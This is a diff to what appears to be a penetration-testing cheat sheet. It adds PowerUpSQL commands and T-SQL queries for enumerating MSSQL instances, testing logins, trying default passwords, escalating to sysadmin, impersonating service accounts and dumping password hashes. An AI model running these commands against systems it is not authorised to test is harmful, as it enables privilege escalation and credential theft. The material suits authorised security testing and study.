@@ -288,9 +288,95 @@ Find-PSRemotingLocalAdminAccess
 ```
 
 #### MSSQL Enumeration
-```
+```powershell filename="PowerUpSQL"
+# Find all local SQL instances
+Get-SQLInstanceLocal -Verbose
+
+# Finding all the SQL instances on a domain
+Get-SQLInstanceDomain -Verbose
+Get-SQLInstanceBroadcast -Verbose
+Get-SQLInstanceScanUDP -Verbose
+
+# get a list of non-default databases from the local server
+Get-SQLInstancelocal | Get-SQLDatabase –Verbose –NoDefaults
+
+# identify a list of SQL Server instances that can be logged into on the domain as the current user
+Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
+# with a different user
+Get-SQLInstanceDomain  -Verbose -DomainController 192.168.1.1 -Username DOMAIN\user -Password 'P@ssw0rd' | Get-SQLConnectionTestThreaded -Verbose  -Username DOMAIN\user -Password 'P@ssw0rd'
+
+Get snapshot of useful information about your potential target
+Get-SQLServerInfo  #(Currentlogin /IsSysadmin : yes/No)
+Get-SQLInstanceLocal | Get-SQLServerInfo
+Get-SQLServerInfo -Instance "COMPUTER_NAME"
 ```
 
+##### MSSQL Exploitation using PowerUpSQL
+```powershell filename="PowerUpSQL"
+# Perform an  audit for common high impact configuration issues // really noisy
+Invoke-SQLAudit -Verbose -Instance "SQLServer1\Instance1"
+
+# attempts to obtain sysadmin privileges using identified vulnerabilities.
+Invoke-SQLEscalatePriv -Verbose -Instance "SQLServer1\Instance1"
+
+# quickly dump databases, privileges, and other information.
+Invoke-SQLDumpInfo -Verbose -Instance "SQLServer1\Instance1"
+# List SQL instances across the domain using default passwords
+Get-SQLInstanceDomain -Verbose | Get-SQLServerLoginDefaultPw -Verbose
+
+#Impersonate the SQL Server service account for the target instance. 
+#-Rev2Self  revert to your original user context with the command below
+Invoke-SQLImpersonateService -Verbose -Instance SQLServer1\Instance1
+
+#pulling SQL Server login password hashes /  -migrate switch to automatically escalate to sysadmin
+#if your executing against a local instance with local administrator privileges.
+Get-SQLServerPasswordHash -Verbose -Instance SQLServer1\Instance1 -Migrate
+```
+
+
+##### SQL Database Enumeration
+```SQL filename="SQL"
+# Version
+SELECT @@version
+
+# Current User
+SELECT SUSER_SNAME(), SELECT SYSTEM_USER
+
+
+# Check if current user is sysadmin
+SELECT IS_SRVROLEMEMBER('sysadmin')
+
+# Current Role
+SELECT user
+
+# Current database
+SELECT db_name()
+
+# List all databases
+SELECT name FROM master.. sysdatabases
+
+# (If below is run  with sysadmin privs more logins are shown)
+# Alllogins on server
+SELECT * FROM sys.server_principals WHERE type_desc != 'SERVER_ROLE'
+
+# All database users for a database
+SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE'
+
+# Listall sysadmin
+SELECT name,type_desc,is_disabled FROM sys.server_principals WHERE IS_SRVROLEMEMBER ('sysadmin',name ) = 1
+
+## Effective Permissions for the server
+SELECT * FROM  fn_my_permissions (NULL, 'Server')
+
+## Effective Permissions for the databse
+ SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
+
+# Active user token
+SELECT * FROM sys.user_token
+
+# Active login token
+SELECT * FROM sys.login_token
+```
 #### Microsoft Exchange and Outlook Web App
 ```
 ```
